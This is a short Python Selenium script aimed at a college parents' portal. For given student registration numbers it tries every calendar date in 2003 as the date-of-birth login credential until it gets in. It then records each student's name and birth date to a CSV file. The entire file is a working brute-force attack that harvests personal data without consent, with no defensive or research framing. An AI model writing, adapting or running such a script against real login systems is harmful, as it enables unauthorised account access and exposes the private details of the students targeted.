from selenium import webdriver
from bs4 import BeautifulSoup
import requests
import time

B_URL = "./chromedriver.exe"
T_URL = "https://parents.msrit.edu/parents_even2022/"
DEPT = "CI"
browser = webdriver.Chrome(executable_path=B_URL)
browser.get(T_URL)
months = ['Jan', 'Aug', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Dec', 'Sep', 'Oct', 'Nov']
year = "2003"
nu = ['1MS21CI049', '1MS21CI009', '1MS21CI032', '1MS21CI014', ]
u = ['1MS21CI049']
with open(f'#dob07.csv', 'w+') as f:
	for k in u:
		success = 0
		# usn = f"1MS21{DEPT}{k:03}"
		usn = k
		for j in months:
			for i in range(1, 32):
				browser.find_element_by_id("username").send_keys(f"{usn}")
				browser.find_element_by_id("dd").send_keys(f"{i:02}")
				browser.find_element_by_id("mm").send_keys(f"{j}")
				browser.find_element_by_id("yyyy").send_keys(f"{year}")
				browser.find_elements_by_tag_name("input")[6].click()
				try:
					name = browser.find_element_by_tag_name("h3")
					if name.text != "Notice Board":
						success = 1
						data = f"{k}{name.text} date of birth is {i:02} {j} {year}\n"
						# datap = f'1MS21CI{k:03}, {name.text}, {i:02}/{j}/{year}\n'
						datap = f'{k}, {name.text}, {i:02}/{j}/{year}\n'
						print(data)
						f.write(datap)
				# browser.back()
				except Exception as e:
					print(e)
					browser.back()
				if success == 1:
					break
